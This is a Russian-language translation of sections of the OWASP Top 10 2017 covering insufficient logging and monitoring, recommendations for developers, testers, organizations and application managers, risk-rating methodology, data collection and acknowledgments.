<table>
<thead>
<tr class="header">
<th>Источники угроз/Векторы атак</th>
<th>Недостатки безопасности</th>
<th>Последствия</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Зависит от прил. : Сложность эксплуатации 2</td>
<td>Распространенность 3 : Сложность обнаружения 1</td>
<td>Технические 2 : Для бизнеса ?</td>
</tr>
<tr class="even">
<td>Эксплуатация недостатков журналирования и мониторинга лежит в основе почти всех крупных взломов. При проведении атак злоумышленники полагаются на отсутствие контроля и своевременного реагирования на инциденты.</td>
<td>Данная уязвимость включена в Топ-10 по результатам <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">отраслевых исследований</a>. Одним из способов определить качество мониторинга является анализ журналов после проведения теста на проникновение. Для определения возможного ущерба все действия тестировщиков должны регистрироваться соответствующим образом.</td>
<td>Большинство атак начинаются с анализа уязвимостей. Возможность проведения подобного анализа повышает вероятность удачной эксплуатации уязвимости практически до 100%. В 2016 году обнаружение факта проникновения занимало в среднем 191 день — нанесенный за это время ущерб мог быть огромным.</td>
</tr>
</tbody>
</table>
<h2 id="является-ли-приложение-уязвимым-9">Является ли приложение уязвимым?</h2>
<p>Недостатки журналирования, обнаружения атак, мониторинга и реагирования на инциденты выявляются постоянно:</p>
<ul>
<li>подвергаемые аудиту события, такие как удачные и неудачные попытки входа в систему, а также важные транзакции, не регистрируются;</li>
<li>предупреждения и ошибки не регистрируются или регистрируются некорректно;</li>
<li>журналы приложений и API не проверяются на предмет подозрительной активности;</li>
<li>журналы хранятся только локально;</li>
<li>пороговые значения предупреждений и схемы реагирования на инциденты отсутствуют или являются неэффективными;</li>
<li>тестирование на проникновение и сканирование инструментами <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> (например, <a href="https://owasp.org/www-project-zap/">OWASP ZAP</a>) не выдают предупреждений;</li>
<li>приложение не может определять, реагировать или предупреждать об атаках в реальном или почти реальном времени.</li>
</ul>
<p>В системе имеется утечка данных, если журналы регистрации и предупреждения доступны пользователям или атакующим (см. <strong>A3:2017-Разглашение конфиденциальных данных</strong>).</p>
<h2 id="как-предотвратить-9">Как предотвратить</h2>
<p>Исходя из значимости данных, хранимых или обрабатываемых приложением, необходимо:</p>
<ul>
<li>регистрировать все ошибки входа, доступа и проверки данных на стороне сервера с указанием контекста, достаточного для выявления подозрительных или вредоносных действий, а также хранить их для последующего анализа;</li>
<li>регистрировать события в формате, наиболее подходящем для обработки централизованной службой журналирования;</li>
<li>использовать контроль целостности журналов аудита важных транзакций для предотвращения подмены или удаления данных, например с помощью доступных только для добавления таблиц БД;</li>
<li>использовать эффективные системы мониторинга и предупреждения для своевременного обнаружения подозрительных действий и реагирования на них;</li>
<li>разработать или утвердить руководство по реагированию на инциденты и устранению их последствий, такое как <a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a>.</li>
</ul>
<p>Существуют коммерческие и бесплатные системы защиты приложений (например, <a href="https://owasp.org/www-project-appsensor/">OWASP AppSensor</a>), межсетевые экраны веб-приложений (например, <a href="https://owasp.org/www-project-modsecurity-core-rule-set/">ModSecurity с набором основных правил OWASP ModSecurity</a>), а также программы корреляции журналов с настраиваемыми панелями и предупреждениями.</p>
<h2 id="примеры-сценариев-атак-9">Примеры сценариев атак</h2>
<p><strong>Сценарий №1</strong>: Форум открытого проекта, используемый небольшой командой, был взломан через уязвимость в его ПО. Злоумышленники удалили внутренний репозиторий, содержащий следующую версию продукта, а также все содержимое форума. Несмотря на возможность восстановления источника, отсутствие мониторинга, журналирования или оповещений привело к более серьезным последствиям. Из-за инцидента программный проект с форума более не развивается.</p>
<p><strong>Сценарий №2</strong>: Злоумышленник может использовать один стандартный пароль для проверки доступа ко всем учетным записям, к некоторым из них он может подойти. Для остальных будет зарегистрирована лишь неудачная попытка входа. Через несколько дней попытка может повториться, но уже с другим паролем.</p>
<p><strong>Сценарий №3</strong>: В крупной торговой сети имеется песочница для внутреннего анализа вредоносных вложений. Средства песочницы обнаружили потенциально вредоносное ПО, но никто не обращал внимания на получаемые от песочницы предупреждения, пока взлом не обнаружили в связи с мошенническими транзакциями по банковским картам от стороннего банка.</p>
<h2 id="ссылки-10">Ссылки</h2>
<h3 id="owasp-10">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c9-security-logging">Проактивная защита OWASP: Реализация журналирования и обнаружения вторжений</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">Стандарт подтверждения безопасности приложений OWASP: V8 Журналирование и мониторинг</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">Руководство OWASP по тестированию: Подробные коды ошибок</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html">Памятка OWASP: Журналирование</a></li>
</ul>
<h3 id="сторонние-10">Сторонние</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Отсутствие регистрации или отображения данных, относящихся к безопасности</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/778.html">CWE-778: Некорректное журналирование</a></li>
</ul>
<h1 id="р-что-делать-разработчикам">+Р Что делать разработчикам</h1>
<h2 id="разработайте-и-применяйте-воспроизводимые-методы-и-стандарты-обеспечения-безопасности">Разработайте и применяйте воспроизводимые методы и стандарты обеспечения безопасности</h2>
<p>Для новичков, а также специалистов, уже хорошо знакомых с проблемами безопасности веб-приложений, создание безопасного веб-приложения или устранение уязвимостей в уже существующем может оказаться непростой задачей. При работе с большим набором приложений задача может показаться невыполнимой.</p>
<p>Чтобы помочь организациям и разработчикам экономически эффективно уменьшить риски, связанные с безопасностью приложений, OWASP создал множество <em><strong>бесплатных и общедоступных</strong></em> ресурсов. Ниже представлены некоторые решения OWASP, позволяющие организациям создавать безопасные веб-приложения и API. На следующей странице представлены дополнительные ресурсы OWASP, предназначенные для проверки безопасности приложений и API.</p>
<table>
<thead>
<tr class="header">
<th>Рекомендация</th>
<th>Описание</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Требования к безопасности приложения</strong></td>
<td>Чтобы создать <em><strong>безопасное</strong></em> веб-приложение, необходимо сначала разработать требования к его безопасности. Для этих целей рекомендуется использовать <a href="https://owasp.org/www-project-application-security-verification-standard/">Стандарт подтверждения безопасности приложений OWASP (ASVS)</a>. При аутсорсинге используйте <a href="https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex">Приложение по безопасности к Контракту на разработку ПО от OWASP</a>. <strong>Примечание</strong>: приложение применимо к договорному праву США, проконсультируйтесь с юристом перед его использованием.</td>
</tr>
<tr class="even">
<td><strong>Архитектура безопасности приложения</strong></td>
<td>Вместо добавления механизмов обеспечения безопасности в готовые приложения и API экономически выгоднее встраивать их на этапе разработки. В качестве руководства при разработке безопасного приложения с нуля рекомендуется использовать <a href="https://cheatsheetseries.owasp.org/">Памятки OWASP</a>.</td>
</tr>
<tr class="odd">
<td><strong>Стандартные средства обеспечения безопасности</strong></td>
<td>Сложно создать надежные и практичные средства обеспечения безопасности. Использование стандартных средств значительно упрощает разработку безопасных приложений и API. <a href="https://owasp.org/www-project-proactive-controls/">Проактивная защита OWASP</a> является хорошим пособием для разработчиков, более того, сейчас многие фреймворки предоставляют стандартные средства контроля безопасности авторизации, защиты от межсайтовой подмены запросов и т. п.</td>
</tr>
<tr class="even">
<td><strong>Жизненный цикл безопасной разработки</strong></td>
<td>Для усовершенствования процесса создания приложений и API рекомендуется использовать <a href="https://owasp.org/www-project-samm/">Модель обеспечения безопасности ПО (SAMM) от OWASP</a>, которая позволяет разработать и реализовать методику обеспечения безопасности ПО, подходящую для конкретной организации.</td>
</tr>
<tr class="odd">
<td><strong>Обучение безопасности приложений</strong></td>
<td><a href="https://owasp.org/www-committee-education-and-training/">Образовательный проект OWASP</a> предоставляет материалы для обучения разработчиков безопасности веб-приложений. Для практических занятий используйте <a href="https://owasp.org/www-project-webgoat/">OWASP WebGoat</a>, <a href="https://github.com/jerryhoff/WebGoat.NET">WebGoat.NET</a>, <a href="https://owasp.org/www-project-node.js-goat/">OWASP NodeJS Goat</a>, <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a> или <a href="https://github.com/chuckfw/owaspbwa/">уязвимые веб-приложения OWASP</a>. Чтобы оставаться в курсе, посещайте <a href="https://owasp.org/events/">Конференции OWASP AppSec</a>, тренинги или собрания региональных <a href="https://owasp.org/chapters/">отделений OWASP</a>.</td>
</tr>
</tbody>
</table>
<p>Существует множество дополнительных ресурсов OWASP. Посетите <a href="https://owasp.org/projects/">страницу проектов OWASP</a>, где на вкладке <em>Project Inventory</em> перечислены проекты <em>Flagship</em>, <em>Labs</em> и <em>Incubator</em>. Большинство ресурсов OWASP доступны на нашей <a href="https://owasp.org/">Вики</a>, а также многие документы OWASP можно заказать в <a href="https://stores.lulu.com/owasp">бумажном или электронном</a> виде.</p>
<h1 id="t-что-делать-тестировщикам">+T Что делать тестировщикам</h1>
<h2 id="внедрите-постоянное-тестирования-безопасности-приложений">Внедрите постоянное тестирования безопасности приложений</h2>
<p>Написать безопасный код — важно, но еще важнее подтвердить правильность реализации и использования разработанных средств защиты. Тестирование безопасности приложения проводится как раз для этих целей. Задача эта сложная и комплексная. Современные методы разработки, такие как Agile и DevOps, оказывают сильное влияние на традиционные подходы и средства, поэтому мы настоятельно рекомендуем определить статус компонентов ваших приложений и подобрать эффективные методы работы с ними.</p>
<p>Современные угрозы быстро эволюционируют, поэтому одного сканирования или пентеста приложений в год уже недостаточно. Современная разработка требует тестирования безопасности в течение всего цикла разработки. Попробуйте улучшить процесс через автоматизацию безопасности. Необходимо также учесть ежегодные расходы на тестирование, экспресс-анализ, исправление, повторное тестирование и развертывание приложения, помноженные на количество поддерживаемых приложений.</p>
<table>
<thead>
<tr class="header">
<th>Рекомендация</th>
<th>Описание</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Понимание модели угроз</strong></td>
<td>Перед началом тестирования убедитесь, что правильно расставили приоритеты, исходя из модели угроз. Если у вас нет модели, ее необходимо разработать. Используйте для этого <a href="https://owasp.org/www-project-application-security-verification-standard/">Стандарт подтверждения безопасности приложений (ASVS)</a> и <a href="https://owasp.org/www-project-web-security-testing-guide/">Руководство по тестированию</a> от OWASP. Не полагайтесь на инструменты вендоров для определения значимых компонентов вашего бизнеса.</td>
</tr>
<tr class="even">
<td><strong>Понимание жизненного цикла разработки</strong></td>
<td>Подход к тестированию безопасности приложения должен соответствовать команде, процессам и инструментам, используемым в течение жизненного цикла разработки ПО. Использование дополнительных шагов, этапов и проверок может привести к разногласиям, попыткам их обхода и нежеланию масштабироваться. Ищите подходящие способы сбора данных о безопасности и внедрения их в ваши процессы.</td>
</tr>
<tr class="odd">
<td><strong>Стратегии тестирования</strong></td>
<td>Выберите самый простой, быстрый и точный способ проверки каждого требования. Используйте <a href="https://owasp.org/www-project-security-knowledge-framework/">Фреймворк знаний по безопасности</a> и <a href="https://owasp.org/www-project-application-security-verification-standard/">Стандарт подтверждения безопасности приложений</a> от OWASP для определения функциональных и нефункциональных требований к безопасности, а также проведения комплексных испытаний. Не забывайте про специалистов, которые будут заниматься ложными срабатываниями или несрабатываниями автоматических инструментов.</td>
</tr>
<tr class="even">
<td><strong>Охват и точность</strong></td>
<td>Необязательно начинать тестировать все подряд. Начните с самого важного и постепенно расширяйте программу проверок, т. е. увеличивайте количество автоматических проверок безопасности и уязвимостей, а также количество проверяемых приложений и API. Цель — достичь состояния, когда основные параметры безопасности всех приложений и API проверяются непрерывно.</td>
</tr>
<tr class="odd">
<td><strong>Сообщайте о результатах правильно</strong></td>
<td>Неважно, насколько хорошо проведено тестирование, если вы не можете грамотно сообщить о результатах. Добейтесь доверия, показав, что вы понимаете принцип работы приложения. Четко, без жаргонизмов, опишите способы и сценарии атак. Оцените реальную сложность обнаружения и эксплуатации уязвимостей, а также серьезность последствий. Наконец, сообщите о результатах исследования средствами, используемыми разработчиками, не в PDF-файлах.</td>
</tr>
</tbody>
</table>
<h1 id="o-что-делать-организациям">+O Что делать организациям</h1>
<h2 id="внедрите-программу-обеспечения-безопасности-приложений-сейчас">Внедрите программу обеспечения безопасности приложений сейчас</h2>
<p>Безопасность приложений больше не является факультативной. Под давлением регуляторов и растущего количества атак организации должны разрабатывать эффективные процессы и средства обеспечения безопасности своих приложений и API. Многие организации стараются справиться с огромным количеством уязвимостей в невероятном объеме кода уже выпущенных приложений и API.</p>
<p>OWASP рекомендует разработать программу обеспечения безопасности, чтобы проанализировать и улучшить безопасность приложений и API. Обеспечение безопасности требует эффективного взаимодействия различных подразделений организации, включая аудиторов, разработчиков, руководителей и администраторов. Безопасность должна быть наглядной и измеряемой, чтобы можно было увидеть и понять состояние безопасности приложения. Сделайте акцент на работах и результатах, которые реально улучшат безопасность и устранят или снизят риски. <a href="https://owasp.org/www-project-samm/">Модель обеспечения безопасности ПО</a> и <a href="https://owasp.org/www-pdf-archive/Owasp-ciso-guide.pdf">Руководство по безопасности приложений для руководителей ИБ</a> от OWASP содержат большинство ключевых активностей из списка.</p>
<h3 id="начало-работы">Начало работы</h3>
<ul>
<li>Задокументируйте все приложения и связанные с ними данные. Крупным организациям рекомендуется использовать для этих целей базу данных управления конфигурацией.</li>
<li>Разработайте <a href="https://owasp.org/www-project-samm/">программу обеспечения безопасности приложений</a> и начните ее реализацию.</li>
<li>Проведите <a href="https://owasp.org/www-project-samm/">анализ недостающих возможностей, сравнив свою организацию с другими компаниями</a>, чтобы определить ключевые области улучшения и план действий.</li>
<li>Получите одобрение руководства и разработайте <a href="https://owasp.org/www-project-samm/">план повышения осведомленности о безопасности приложений</a> для данной организации.</li>
</ul>
<h3 id="общий-подход-на-основе-рисков">Общий подход на основе рисков</h3>
<ul>
<li>Определите <a href="https://owasp.org/www-project-samm/">требуемый уровень защиты</a> ваших <a href="https://owasp.org/www-project-samm/">приложений</a> с точки зрения бизнеса. При этом руководствуйтесь законами о конфиденциальности и другими нормативными документами, относящимися к защищаемым данным.</li>
<li>Разработайте <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">модель оценки наиболее распространенных угроз</a> с указанием факторов вероятности и риска, отражающих устойчивость вашей организации к атакам.</li>
<li>Оцените и приоритизируйте ваши приложения и API. Внесите результаты в БД управления конфигурацией.</li>
<li>Разработайте руководство по корректному определению требуемого уровня покрытия и точности.</li>
</ul>
<h3 id="подготовка-надёжной-базы">Подготовка надёжной базы</h3>
<ul>
<li>Разработайте специальные <a href="https://owasp.org/www-project-samm/">политики и стандарты</a>, которые будут использоваться всеми разработчиками в качестве основ обеспечения безопасности приложений.</li>
<li>Определите <a href="https://owasp.org/www-project-security-knowledge-framework/">набор стандартных средств обеспечения безопасности</a>, которые будут дополнять эти политики и стандарты, а также содержать руководство по их использованию при проектировании и разработке.</li>
<li>Разработайте <a href="https://owasp.org/www-project-samm/">курсы по обеспечению безопасности приложений</a>, посвященные разным темам и целям разработки.</li>
</ul>
<h3 id="интеграция-безопасности-в-существующие-процессы">Интеграция безопасности в существующие процессы</h3>
<ul>
<li>Определите и внедрите в существующие процессы разработки и эксплуатации мероприятия по <a href="https://owasp.org/www-project-samm/">безопасной реализации</a> и устранение недостатков.</li>
<li>Для достижения успеха обеспечьте наличие экспертов в предметной области и <a href="https://owasp.org/www-project-samm/">служб поддержки для разработчиков и проектной команды</a>.</li>
</ul>
<h3 id="обеспечение-визуального-контроля">Обеспечение визуального контроля</h3>
<ul>
<li>Работайте с метриками. Принимайте решения об улучшениях и финансировании на основе метрик и данных аналитики. Метрики должны отражать средства и методы обеспечения безопасности, обнаруженные и устраненные уязвимости, покрытие приложения, описание ошибок по типу и количеству и т. п.</li>
<li>Анализируйте данные по реализации и контролю для поиска основных причин и шаблонов уязвимостей при проведении стратегических и системных улучшений в компании. Учитывайте ошибки и предлагайте поощрения для продвижения улучшений.</li>
</ul>
<h1 id="м-что-делать-менеджерам-приложений">+М: Что делать менеджерам приложений</h1>
<h2 id="управление-жизненным-циклом-приложения">Управление жизненным циклом приложения</h2>
<p>Приложения относятся к наиболее сложным системам, которые люди постоянно создают и обслуживают. Администрирование приложений необходимо поручать ИТ-специалистам, которые будут отвечать за весь их жизненный цикл. Мы предлагаем назначать менеджеров приложений, которые будут отвечать за технические аспекты приложения на протяжении его жизненного цикла, начиная со сбора требований и заканчивая выводом систем из эксплуатации, про что так часто забывают.</p>
<h2 id="требования-и-управление-ресурсами">Требования и управление ресурсами</h2>
<ul>
<li>Соберите и обсудите с заказчиком бизнес-требования к приложению, включая обеспечение конфиденциальности, подлинности, целостности и доступности всех информационных активов, а также ожидаемую бизнес-логику.</li>
<li>Составьте перечень технических требований, включая функциональные и нефункциональные требования по безопасности.</li>
<li>Спланируйте и обсудите бюджет, охватывающий все аспекты проектирования, создания, тестирования и эксплуатации, а также работы по обеспечению безопасности.</li>
</ul>
<h2 id="запрос-предложений-и-заключение-контракта">Запрос предложений и заключение контракта</h2>
<ul>
<li>Обсудите требования с внутренними и внешними разработчиками, включая нормативы и требования вашей программы обеспечения безопасности, например рекомендации по жизненному циклу разработки ПО.</li>
<li>Оцените выполнение всех технических требований, включая этап планирования и проектирования.</li>
<li>Обсудите все технические требования, включая проектирование, безопасность и гарантийные обязательства.</li>
<li>Используйте шаблоны и контрольные списки, например <a href="https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex">Приложение по безопасности к Контракту на разработку ПО от OWASP</a>. <strong>Примечание</strong>: приложение применимо к договорному праву США, проконсультируйтесь с юристом перед его использованием.</li>
</ul>
<h2 id="планирование-и-проектирование">Планирование и проектирование</h2>
<ul>
<li>Обсудите планы и проекты с разработчиками и внутренними партнерами, например специалистами по безопасности.</li>
<li>Определите архитектуру и средства управления безопасностью, а также контрмеры, соответствующие требованиям защиты и ожидаемым уровням опасности. Все это должно обеспечиваться специалистами по безопасности.</li>
<li>Убедитесь, что владелец приложения принимает остальные риски или предоставляет дополнительные ресурсы.</li>
<li>В каждом спринте обеспечьте создание записей по безопасности с указанием ограничений, добавленных для нефункциональных требований.</li>
</ul>
<h2 id="развертывание-тестирование-и-внедрение">Развертывание, тестирование и внедрение</h2>
<ul>
<li>Автоматизируйте безопасное развертывание приложения, интерфейсов и компонентов, а также получение необходимых разрешений.</li>
<li>Протестируйте технические возможности и интеграцию с ИТ-архитектурой, а также организуйте бизнес-тестирование.</li>
<li>Протестируйте "штатное" и "нештатное" использование технических и производственных возможностей.</li>
<li>Организуйте тестирование безопасности в соответствии с внутренними процессами, требованиями защиты и предполагаемым уровнем опасности для каждого приложения.</li>
<li>Введите приложение в эксплуатацию и перестаньте использовать старые приложения при необходимости.</li>
<li>Согласуйте всю документацию, а также базу данных контроля изменений и архитектуру безопасности.</li>
</ul>
<h2 id="работы-и-контроль-изменений">Работы и контроль изменений</h2>
<ul>
<li>Работы должны включать в себя управление безопасностью приложения (например, управление обновлениями).</li>
<li>Обратите внимание пользователей на безопасность, а также найдите компромисс между практичностью и безопасностью.</li>
<li>Спланируйте и проведите модификации, например переход на новую версию приложения или использование других компонентов (ОС, ПО или библиотек).</li>
<li>Обновите документацию, включая документацию по контролю изменений, архитектуре безопасности, элементам управления и мерам противодействия, а также документацию по текущим задачам или проектам.</li>
</ul>
<h2 id="вывод-из-эксплуатации">Вывод из эксплуатации</h2>
<ul>
<li>Все важные данные необходимо заархивировать, а остальные безопасно удалить.</li>
<li>Осуществите безопасный вывод приложения из эксплуатации, включая удаление неиспользуемых учетных записей, а также ролей и разрешений.</li>
<li>Установите приложению статус "выведено из эксплуатации" в БД контроля изменений.</li>
</ul>
<h1 id="у-об-угрозах">+У Об угрозах</h1>
<h2 id="степень-опасности-уязвимостей">Степень опасности уязвимостей</h2>
<p>Методика оценки степени опасности уязвимостей для списка Топ-10 основана на <a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">Методике оценки рисков OWASP</a>. Для каждой категории угроз оценивались характерные для стандартного веб-приложения недостатки, исходя из факторов их вероятности и риска. Затем угрозы группировались по степени опасности для веб-приложений. Список уязвимостей обновляется с каждым новым выпуском Топ-10, по мере изменения среды и условий эксплуатации.</p>
<p><a href="https://owasp.org/www-community/OWASP_Risk_Rating_Methodology">Методика оценки рисков OWASP</a> описывает множество факторов, помогающих оценить опасность обнаруженной уязвимости. Топ-10 предоставляет лишь обобщенные данные, а не информацию о конкретных уязвимостях в реальных приложениях и API. Поэтому никто кроме владельца или менеджера приложения не сможет точно оценить риски, угрожающие конкретному приложению. Только вы обладаете наиболее полными знаниями, чтобы судить о значимости ваших приложений и данных, наличии возможных угроз, а также принципах работы и использования вашей системы.</p>
<p>Наша методика определяет три фактора вероятности наличия уязвимости (распространенность, сложность обнаружения и сложность эксплуатации) и один фактор ее опасности (технические последствия). Уровень значимости каждого фактора классифицируется от 1 (низкий) до 3 (высокий) и определяется специальными терминами. Распространенность, как правило, не требует расчета. Статистические данные по распространенности, предоставленные организациями (см. Благодарности на стр. 24), были обработаны и интегрированы в список Топ-10. Затем эти данные были объединены с двумя другими факторами вероятности (сложность обнаружения и сложность эксплуатации) для расчета вероятности наличия каждой уязвимости. Полученное значение было умножено на среднее значение тяжести технических последствий для определения совокупной опасности каждого пункта списка Топ-10 (чем выше результат, тем выше опасность). Сложность обнаружения и эксплуатации, а также последствия рассчитывались на основе CVE, связанных с каждой категорией Топ-10.</p>
<p><strong>Примечание</strong>: данный подход не учитывает источники угроз, а также технические особенности отдельных приложений. Любой из этих факторов может в значительной степени повлиять на общую вероятность обнаружения и эксплуатации злоумышленником уязвимости. Классификация также не учитывает реальные последствия для бизнеса. Каждая организация должна сама решить, насколько небезопасными могут быть ее приложения и API с учетом сложившихся традиций, отрасли применения и нормативной базы. В задачи Топ-10 OWASP не входит анализ угроз для конкретной организации.</p>
<p>Ниже представлен расчет степени опасности <strong>A6:2017-Некорректной настройки параметров безопасности</strong></p>
<p><img src="images/0xc0-risk-explanation.png" alt="Расчёт рисков для A6:2017-Некорректная настройка параметров безопасности" /></p>
<h1 id="фр-о-факторах-риска">+ФР О факторах риска</h1>
<h2 id="сводная-таблица-угроз-топ-10">Сводная таблица угроз Топ-10</h2>
<p>Таблица ниже содержит сводную информацию о Топ-10 угроз безопасности приложений 2017 г., а также факторы риска, назначенные для каждой из угроз. Эти факторы определялись на основе доступной статистики и опыта команды Топ-10 OWASP. Чтобы рассчитать риски для конкретного приложения или организации, необходимо определить специфичные для них источники угроз и последствия для бизнеса. Даже значительные недостатки ПО могут не представлять серьезной опасности, если отсутствуют источники угроз или последствия для бизнеса являются незначительными для рассматриваемых активов.</p>
<p><img src="images/0xc1-risk-factor-table.png" alt="Таблица факторов риска" /></p>
<h2 id="дополнительные-риски-требующие-внимания">Дополнительные риски, требующие внимания</h2>
<p>Помимо угроз, представленных в Топ-10, существуют другие риски, которые необходимо оценивать и учитывать. Некоторые из них уже описывались в прошлых версиях Топ-10, а некоторые — нет, включая новые техники атак, которые появляются постоянно. Ниже перечислены дополнительные угрозы безопасности приложений (по номеру CWE), на которые также необходимо обратить внимание:</p>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Межсайтовая подмена запросов (CSRF)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400: Неконтролируемое использование ресурсов ("Чрезмерное потребление ресурсов", "Отказ в обслуживании приложения")</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434: Отсутствие ограничений на загрузку файлов небезопасного типа</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/451.html">CWE-451: Некорректное представление важной информации интерфейсом пользователя (Подмена интерфейса/курсора и прочее)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: Перенаправление на небезопасный сайт ("Открытая переадресация")</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/799.html">CWE-799: Некорректное ограничение частоты взаимодействия (Противодействие автоматизации)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/829.html">CWE-829: Использование функций недоверенных источников (Сторонний контент)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Подмена запросов на стороне сервера (SSRF)</a></li>
</ul>
<h1 id="мд-методология-и-данные">+МД Методология и данные</h1>
<p>На саммите OWASP активные участники и члены сообщества приняли решение о представлении уязвимостей, двух перспективных классах уязвимостей, а также классификации уязвимостей на основе количественных и качественных данных.</p>
<h2 id="отраслевые-исследования">Отраслевые исследования</h2>
<p>Для исследования были отобраны категории уязвимостей, которые ранее считались кандидатами или упоминались в отзывах на 2017 RC1 в списке рассылки Топ-10. Мы упорядочили эти данные и попросили сообщество выделить топ-четыре уязвимостей, которые стоит включить в Топ-10 OWASP — 2017. Опрос проводился со 2 августа по 18 сентября 2017 г. Было получено 516 ответов, на основе которых были определены категории уязвимостей.</p>
<table>
<thead>
<tr class="header">
<th>Категория</th>
<th>Виды уязвимостей по данным исследования</th>
<th>Оценка</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>Разглашение конфиденциальных данных (Нарушение конфиденциальности) [CWE-359]</td>
<td>748</td>
</tr>
<tr class="even">
<td>2</td>
<td>Уязвимости, связанные с шифрованием [CWE-310/311/312/326/327]</td>
<td>584</td>
</tr>
<tr class="odd">
<td>3</td>
<td>Десериализация недоверенных данных [CWE-502]</td>
<td>514</td>
</tr>
<tr class="even">
<td>4</td>
<td>Обход авторизации с использованием ключа пользователя (Небезопасные прямые ссылки на объекты* и Подмена пути) [CWE-639]</td>
<td>493</td>
</tr>
<tr class="odd">
<td>5</td>
<td>Недостатки журналирования и мониторинга [CWE-223 / CWE-778]</td>
<td>440</td>
</tr>
</tbody>
</table>
<p>Разглашение частной информации, без сомнения, является самой серьезной уязвимостью, но лишь дополняет существующую категорию <strong>A3:2017-Разглашение конфиденциальных данных</strong>. Сюда же можно отнести уязвимости, связанные с шифрованием. Небезопасная десериализация была третьей по данным опроса, поэтому после оценки ее опасности она была добавлена в Топ-10 в качестве категории <strong>A8:2017-Небезопасная десериализация</strong>. Под четвертым номером шли уязвимости, связанные с ключами пользователей, и их включили в список в категорию <strong>A5:2017-Недостатки контроля доступа</strong>. Приятно видеть, что в ходе исследования высоко оценили важность этих уязвимостей, поскольку данных по ним немного. Пятыми в списке шли недостатки журналирования и мониторинга, которые дополнили Топ-10 категорией <strong>A10:2017-Недостатки журналирования и мониторинга</strong>. Настало время, когда приложение должно уметь определять атаки, регистрировать связанные с ними события, а также выводить предупреждения и реагировать на них.</p>
<h2 id="открытый-сбор-данных">Открытый сбор данных</h2>
<p>Традиционно данные собирались и анализировались на основе частотности: сколько уязвимостей было обнаружено в приложениях. Известно, что автоматизированные средства сообщают обо всех фактах обнаружения одной и той же уязвимости, а специалисты — об обнаружении одной уязвимости, но в разных условиях. Поэтому при анализе сложно объединить два этих подхода.</p>
<p>Для Топ-10 OWASP — 2017 коэффициент уязвимости рассчитывался на основе количества приложений, имеющих одну или более уязвимостей определенного типа. Большинство данных предоставлялось в двух вариантах: в традиционном частотном, с подсчетом всех фактов обнаружения уязвимости, и нетрадиционном, с подсчетом приложений, в которых уязвимость была обнаружена (один или более раз). Несмотря на несовершенство, этот подход позволяет сравнить данные, полученные специалистами с помощью специализированных средств, и данные, полученные специализированными средствами с участием специалистов. Необработанные данные и результаты анализа <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall">доступны на GitHub</a>. Для будущих версий Топ-10 планируется создание дополнительной структуры, предназначенной для этих целей.</p>
<p>В ответ на призыв о сборе информации было получено более 40 комплектов данных. Большинство из них идентично полученным в ходе первоначального сбора (на основе частотного подхода), поэтому мы использовали данные только 23 источников, охватывающие ≈114 тыс. приложений. По возможности брались данные за один год от одного источника. Большинство приложений являются уникальными, хотя есть вероятность повторения приложений в ежегодных данных от Veracode. Данные из 23 комплектов были поделены на полученные специалистами с помощью специальных средств и коэффициенты уязвимости, полученные с помощью инструментов с участием специалистов. Мы рассчитали процентное соотношение приложений, содержащих каждый тип уязвимости. Коэффициент уязвимости использовался для расчета распространенности при оценке опасности для определения статуса уязвимости в списке Топ-10.</p>
<h1 id="благодарности">Благодарности</h1>
<h2 id="организации-предоставившие-данные">Организации, предоставившие данные</h2>
<p>Хотим поблагодарить организации, которые предоставили свои данные по уязвимостям для Топ-10 OWASP — 2017:</p>
<ul>
<li>ANCAP</li>
<li>Aspect Security</li>
<li>AsTech Consulting</li>
<li>Atos</li>
<li>Branding Brand</li>
<li>Bugcrowd</li>
<li>BUGemot</li>
<li>CDAC</li>
<li>Checkmarx</li>
<li>Colegio LaSalle Monteria</li>
<li>Company.com</li>
<li>ContextIS</li>
<li>Contrast Security</li>
<li>DDoS.com</li>
<li>Derek Weeks</li>
<li>Easybss</li>
<li>Edgescan</li>
<li>EVRY</li>
<li>EZI</li>
<li>Hamed</li>
<li>Hidden</li>
<li>I4 Consulting</li>
<li>iBLISS Seguran̤a &amp; Intelig̻encia</li>
<li>ITsec Security Services bv</li>
<li>Khallagh</li>
<li>Linden Lab</li>
<li>M. Limacher IT Dienstleistungen</li>
<li>Micro Focus Fortify</li>
<li>Minded Security</li>
<li>National Center for Cyber Security Technology</li>
<li>Network Test Labs Inc.</li>
<li>Osampa</li>
<li>Paladion Networks</li>
<li>Purpletalk</li>
<li>Secure Network</li>
<li>Shape Security</li>
<li>SHCP</li>
<li>Softtek</li>
<li>Synopsis</li>
<li>TCS</li>
<li>Vantage Point</li>
<li>Veracode</li>
<li>Web.com</li>
</ul>
